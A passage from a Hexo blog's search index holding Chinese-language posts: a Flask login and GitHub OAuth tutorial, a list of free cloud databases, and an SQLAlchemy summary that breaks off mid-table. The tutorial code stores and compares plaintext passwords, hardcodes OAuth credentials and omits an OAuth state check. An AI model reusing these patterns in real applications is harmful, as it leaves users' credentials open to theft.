class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        passwd <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'passwd'</span><span class="token punctuation">)</span>        code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#try:</span>        q1 <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Demo_Login_Users<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>db<span class="token punctuation">.</span>and_<span class="token punctuation">(</span>Demo_Login_Users<span class="token punctuation">.</span>name <span class="token operator">==</span> user<span class="token punctuation">,</span> Demo_Login_Users<span class="token punctuation">.</span>password <span class="token operator">==</span> passwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'temp.json'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            temp <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(type(q1))</span>        <span class="token comment" spellcheck="true">#print(q1 != None)</span>        <span class="token keyword">if</span> q1 <span class="token operator">!=</span> None <span class="token operator">and</span> code<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'success'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="11-第三方登录-使用github"><a href="#11-第三方登录-使用github" class="headerlink" title="11.第三方登录(使用github)"></a>11.第三方登录(使用<code>github</code>)</h3><blockquote><p>有关<code>OAuth2</code>第三方登录的<a href="https://wenyan.online/2020/09/05/oauth2-demo-md/" target="_blank" rel="noopener">理论说明</a>:<code>https://wenyan.online/2020/09/05/oauth2-demo-md/</code></p><p>因为<code>github</code>是最容易的,而且它非常的简单,这里使用<code>github</code>为例.</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_foot_oauth_list<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_foot_oauth_item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>IMAGE/github_log.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>github<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">       <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#github'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseover</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.div_foot_content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string">'slow'</span><span class="token punctuation">)</span>           <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#github'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.div_foot_content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token string">'slow'</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span>   </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>IMAGE/qq_log.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span>  <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>qq<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>IMAGE/wechat_log.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wechat<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>div_foot_content<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>点击使用Github登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><ol><li>登录<code>gtihub</code></li><li>点击<code>setting-developer setting-oauth apps</code></li><li>然后点击<code>new oauth app</code>,注册一个<code>app</code>,主要参数有</li></ol><ul><li><p><code>application name</code>:应用名称</p></li><li><p><code>homepage url</code>:网站根目录,可以指定<code>127.0.0.1:5000</code>或者其他<code>ip</code>地址.</p></li><li><p><code>application description</code>:描述信息</p></li><li><p><code>authorization callback url</code>:这个选项比较重要,指定登录成功的回调地址.</p></li></ul><p>4.注册成功后,会看到<code>client id\ client secret</code>,这两个参数非常重要,是主要的登录参数.</p><hr><p>修改<code>app.py</code>,添加一个登录<code>github</code>的路由</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> furl <span class="token keyword">import</span> furl<span class="token comment" spellcheck="true"># 两把钥匙</span>client_id <span class="token operator">=</span> <span class="token string">'ac1a83607220b24347d8'</span>client_secret <span class="token operator">=</span> <span class="token string">'5985ef31f96d9ac2782bdd59685c8d53b407**'</span><span class="token comment" spellcheck="true"># github登录路由</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/redirect_github/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">redirect_github</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://github.com/login/oauth/authorize'</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'client_id'</span> <span class="token punctuation">:</span> client_id<span class="token punctuation">,</span>        <span class="token string">'scope'</span><span class="token punctuation">:</span> <span class="token string">'read:user'</span><span class="token punctuation">,</span>        <span class="token string">'allow_signup'</span><span class="token punctuation">:</span> <span class="token string">'true'</span>    <span class="token punctuation">}</span>    url <span class="token operator">=</span> furl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>set<span class="token punctuation">(</span>params<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>furl</code>:是一个第三方扩展.</p><p>访问<code>192.168.0.110:8080/redirect_github/</code>就能直接运行<code>github</code>网站登录页面</p><p>浏览器没有登录过<code>github</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-8-29/1598704279815-10232.png" alt="10233"></p><p>浏览器登陆过<code>github</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-8-30/1598793183347-10234.png" alt="10234"></p><p>点击授权后,<code>github</code>就会跳转到之前设置的<code>callback</code>页面.</p><hr><p>从<code>github</code>获取用户信息,这就需要用到<code>secret key</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">import</span> requests@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/oauth2/&lt;service>/callback'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">oauth2_callback</span><span class="token punctuation">(</span>service<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>service<span class="token punctuation">)</span>    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 根据code 获取 access token</span>    access_token_url <span class="token operator">=</span> <span class="token string">'https://github.com/login/oauth/access_token'</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'client_id'</span><span class="token punctuation">:</span> client_id<span class="token punctuation">,</span>        <span class="token string">'client_secret'</span><span class="token punctuation">:</span> client_secret<span class="token punctuation">,</span>        <span class="token string">'code'</span> <span class="token punctuation">:</span> code    <span class="token punctuation">}</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>access_token_url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    access_token <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'access_token'</span><span class="token punctuation">)</span>    access_user_url <span class="token operator">=</span> <span class="token string">'https://api.github.com/user'</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>access_user_url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string">'token '</span> <span class="token operator">+</span> access_token<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span>        <span class="token string">'data'</span><span class="token punctuation">:</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登录跳转完成后,会生成一个<code>json</code>文件,里面包含了<code>github</code>的账户信息.</p><p>这个时候,我们就需要根据这个<code>json</code>文件,写入到<code>mysql</code>数据库账户的相关细信息.</p><p>而且这个<code>callback</code>我们要做好再次的<code>URL</code>跳转,因为这个页面是不能前端呈现的.</p><p>这个不在深究,后续会找到替代的<code>flask</code>插件.</p><hr><p>修改<code>login.html</code></p><pre class="line-numbers language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>redirect_github<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>IMAGE/github_log.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>github<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>                           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#github'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseover</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.div_foot_content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string">'slow'</span><span class="token punctuation">)</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#github'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.div_foot_content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token string">'slow'</span><span class="token punctuation">)</span>               <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
            <tag> Pillow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费在线云数据库</title>
      <link href="/posts/58427.html"/>
      <url>/posts/58427.html</url>
      
        <content type="html"><![CDATA[<h2 id="免费在线云数据库"><a href="#免费在线云数据库" class="headerlink" title="免费在线云数据库"></a>免费在线云数据库</h2><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-1/1598970771491-10242.png" alt="10242"></p><blockquote><p>记录一些网络上的在线可用的小型免费数据库,容量<code>20-512MB</code>不等.</p></blockquote><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><code>MySQL</code></h3><h4 id="1-db4free"><a href="#1-db4free" class="headerlink" title="1.db4free"></a>1.<code>db4free</code></h4><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-1/1598970223324-10239.png" alt="10239"></p><p><code>db4free</code>使用非常简单,只需要使用邮箱就可以注册,但是它不是一个商业性的工具,访问速度非常慢,并且存在停机,数据丢失这种高风险的情况.总体来说,它是一个可以临时提供一个测试环境.</p><ul><li>提供<code>phpmyadmin</code>管理工具.</li><li>不需要备案</li></ul><p><a href="https://www.db4free.net/index.php?language=zh" target="_blank" rel="noopener">db4free</a>:<code>https://www.db4free.net/index.php?language=zh</code></p></blockquote><h4 id="2-remotemysql"><a href="#2-remotemysql" class="headerlink" title="2.remotemysql"></a>2.<code>remotemysql</code></h4><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-1/1598970347430-10238.png" alt="10238"></p><p><code>remotemysql</code>提供一个免费的<code>MySQL database</code>,大小有 <code>100M</code>,访问速度尚可,同样的,建议作为一个临时性的存放数据的仓库.</p><ul><li>提供<code>phpmyadmin</code>管理工具.</li><li>不需要备案</li></ul><p><a href="https://remotemysql.com/" target="_blank" rel="noopener">remotemysql</a>:<code>https://remotemysql.com/</code></p></blockquote><h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a><code>MongoDB</code></h3><h4 id="1-mlab"><a href="#1-mlab" class="headerlink" title="1.mlab"></a>1.<code>mlab</code></h4><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-1/1598970223320-10240.png" alt="10240"></p><p><code>mlab</code>提供永久免费的<code>500MB</code>数据库服务,而且提供较好的服务保障.</p><p>但是由于是国外网站的缘故,会出现连接慢的问题.</p><p><a href="https://mlab.com/" target="_blank" rel="noopener">mlab</a>:<code>https://mlab.com/</code></p></blockquote><h4 id="2-MongoDB-Altlas"><a href="#2-MongoDB-Altlas" class="headerlink" title="2.MongoDB Altlas"></a>2.<code>MongoDB Altlas</code></h4><blockquote><p><code>MongoDB Altlas</code>提供<code>512M</code>的数据库服务,有香港节点,可以选择<code>Azure</code>.</p><p><a href="https://cloud.mongodb.com/" target="_blank" rel="noopener">mongodb</a>:<code>https://cloud.mongodb.com/</code></p></blockquote><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a><code>PostgreSQL</code></h3><h4 id="1-elephantsql"><a href="#1-elephantsql" class="headerlink" title="1.elephantsql"></a>1.<code>elephantsql</code></h4><blockquote><p>提供<code>20MB</code>的在线数据库,非常小.</p><p><a href="https://www.elephantsql.com/" target="_blank" rel="noopener">elephantsql</a>:<a href="https://www.elephantsql.com/" target="_blank" rel="noopener">https://www.elephantsql.com/</a></p></blockquote><h4 id="2-Heroku"><a href="#2-Heroku" class="headerlink" title="2.Heroku"></a>2.<code>Heroku</code></h4><blockquote><p>提供免费的<code>2W</code>行数据.地址:<a href="https://www.elephantsql.com/" target="_blank" rel="noopener">https://www.elephantsql.com/</a></p></blockquote><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><code>Redis</code></h3><h4 id="1-redislabs"><a href="#1-redislabs" class="headerlink" title="1.redislabs"></a>1.<code>redislabs</code></h4><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-1/1598970223312-10241.png" alt="10241"></p><p>提供 <code>30MB</code> 空间免费 <code>Redis</code>在线数据库服务,但是访问速度慢.</p><p><code>redislabs</code>:<code>https://app.redislabs.com/#/login</code></p></blockquote><h3 id="大型云服务供应商"><a href="#大型云服务供应商" class="headerlink" title="大型云服务供应商"></a>大型云服务供应商</h3><h4 id="1-amazon"><a href="#1-amazon" class="headerlink" title="1.amazon"></a>1.<code>amazon</code></h4><blockquote><p>推荐<code>amazon</code>,不用备案,而且送12个月的免费套餐.访问<code>aws.amazon.com/free</code></p></blockquote><h4 id="2-google"><a href="#2-google" class="headerlink" title="2.google"></a>2.<code>google</code></h4><blockquote><p>访问<code>https://cloud.google.com/free 获得更多信息.</code></p></blockquote><h4 id="3-azure"><a href="#3-azure" class="headerlink" title="3.azure"></a>3.<code>azure</code></h4><blockquote><p>访问<code>https://azure.microsoft.com/zh-cn/free/?cdn=disable</code> 获得更多信息.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> MongoDB </tag>
            
            <tag> Redis </tag>
            
            <tag> PostgreSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLAlchemy总结</title>
      <link href="/posts/4022.html"/>
      <url>/posts/4022.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10229.png" alt="10229"></p><h2 id="SQLAlchemy总结"><a href="#SQLAlchemy总结" class="headerlink" title="SQLAlchemy总结"></a><code>SQLAlchemy</code>总结</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><blockquote><p><code>SQLAlchemy</code>是和数据库交互的一个库,他支持<code>postgresql,mysql,oracle,ms.sql</code>等等主流的数据库.虽然各个厂商使用的<code>SQL</code>语言不通,但是<code>SQLAlcyhemy</code> 在底层封装了她们,可以使用一套标准来操作数据库.</p><p>官网:<code>https://docs.sqlalchemy.org/en/13/</code></p><p><code>SQLAlchemy</code>构成:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/sqlalchemy.jpg" alt="sqlalchemy"></p><p>最主要的构成部分是<code>SQLAlchemy Core</code>和<code>SQLAlchemy ORM</code>两大部分.</p><ul><li><code>SQLAlchemy Core</code>:基于<code>Scheme</code>,类似传统的<code>SQL</code>语句.<ul><li><code>scheme/types</code>:内部实现了类和表的对应</li><li><code>SQL Expression Language</code>:封装好的<code>SQL</code>语句.</li><li><code>Engine</code>:一个数据库的连接<ul><li><code>connection pooling</code>:连接池</li><li><code>Dlalect</code>:根据<code>Engine</code> 的定义,调用不同的数据库<code>API</code> (比如<code>mysql+pymysql</code>)</li></ul></li></ul></li><li><code>SQLAlchemy ORM</code>: <code>ORM</code> ,关系对象映射,更好的从面向对象的角度去操作数据库.下面着重讨论<code>ORM</code>.</li></ul></blockquote><h3 id="2-什么是ORM"><a href="#2-什么是ORM" class="headerlink" title="2.什么是ORM"></a>2.什么是<code>ORM</code></h3><blockquote><p><code>ORM:(Object-Relationship Mapping)</code>:对象关系映射.</p><p>对象和关系数据是业务实体的两种表现形式.业务实体在内存中表现为对象,在数据库中表现为关系数据.内存中的对象之间存在关联和继承关系.而在数据库中,关系数据无法直接表达多对多关联和继承关系.因此,<code>ORM</code> 一般以中间件的形式存在,主要实现程序对象到关系数据库数据的映射.</p><p>数据库中的表都是二维表,它的基本结构是行和列.如果一张表的内容用<code>python</code> 的数据结构表示出来的话,可以用一个<code>list</code> 来表示,它类似与<code>list((1,2))</code> .在<code>list</code> 中包裹<code>tuple</code> 来表示一行记录.</p><p>比如,一张包含<code>id</code>,<code>name</code>的<code>user</code> 表</p><pre class="line-numbers language-python"><code class="language-python">user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'Bob'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Harry'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Python</code> 的<code>DB-API</code> 返回的数据结构就类似上面这样的.</p><p>但是使用<code>tuple</code> 来表示一行,很难看出表的结构.比如在<code>mysql</code> 中也存在一张<code>Users</code>表.</p><pre class="line-numbers language-sql"><code class="language-sql">mysql root<span class="token variable">@192.168.101</span>:test<span class="token operator">></span> <span class="token keyword">desc</span> Users<span class="token punctuation">;</span>                                                                                                                                                                           <span class="token operator">+</span><span class="token comment" spellcheck="true">----------+-------------+------+-----+---------+-------+</span><span class="token operator">|</span> Field    <span class="token operator">|</span> <span class="token keyword">Type</span>        <span class="token operator">|</span> <span class="token boolean">Null</span> <span class="token operator">|</span> <span class="token keyword">Key</span> <span class="token operator">|</span> <span class="token keyword">Default</span> <span class="token operator">|</span> Extra <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----------+-------------+------+-----+---------+-------+</span><span class="token operator">|</span> id       <span class="token operator">|</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>     <span class="token operator">|</span> <span class="token keyword">NO</span>   <span class="token operator">|</span> PRI <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span>  <span class="token operator">|</span>       <span class="token operator">|</span><span class="token operator">|</span> name     <span class="token operator">|</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span>  <span class="token operator">|</span>       <span class="token operator">|</span><span class="token operator">|</span> fullname <span class="token operator">|</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token operator">></span>  <span class="token operator">|</span>       <span class="token operator">|</span><span class="token operator">|</span> password <span class="token operator">|</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">&lt;</span><span class="token boolean">null</span><span class="token 